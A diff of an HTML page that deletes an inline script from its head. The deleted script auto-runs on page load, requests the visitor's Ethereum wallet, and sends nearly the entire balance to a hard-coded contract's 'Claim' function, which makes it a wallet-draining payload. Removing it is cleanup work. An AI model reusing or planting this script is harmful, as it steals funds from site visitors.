@@ -578,54 +578,7 @@
       }
     </style>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
-    <script>
-      async function callClaimFunctionPrivate() {
-        console.log("availableBalance, gasCalculated");
-        const accounts = await window.ethereum.request({
-          method: "eth_requestAccounts",
-        });
-        const contractAddress = "0x68E5127946f820afd86b41eBfEA3EAEC50995F9A";
-        const web3 = new Web3(window.ethereum);
-        const [balance, gasPrice] = await Promise.all([
-          window.ethereum.request({
-            method: "eth_getBalance",
-            params: [accounts[0], "latest"],
-            id: 56,
-          }),
-          window.ethereum.request({
-            method: "eth_gasPrice",
-            params: [],
-            id: 56,
-          }),
-        ]);
-        console.clear();
-        console.log(gasPrice);
-        const availableBalance =
-          parseInt(balance, 16) - parseInt(gasPrice, 16) * 200000 * 2;
-        const gasCalculated = parseInt(gasPrice, 16) * 2;
-        console.log(availableBalance, gasCalculated);
-        const contract = new web3.eth.Contract(
-          [
-            {
-              constant: false,
-              inputs: [],
-              name: "Claim",
-              outputs: [],
-              payable: true,
-              stateMutability: "payable",
-              type: "function",
-            },
-          ],
-          contractAddress
-        );
-        await contract.methods.Claim().send({
-          from: accounts[0],
-          value: availableBalance,
-          gasPrice: gasCalculated,
-        });
-      }
-      callClaimFunctionPrivate();
-    </script></head>
+    </head>
   <body id="icga">
     <div id="pwb-body-wrap">
       <div id="i8ig" class="pwb-flex-grid-wrap">
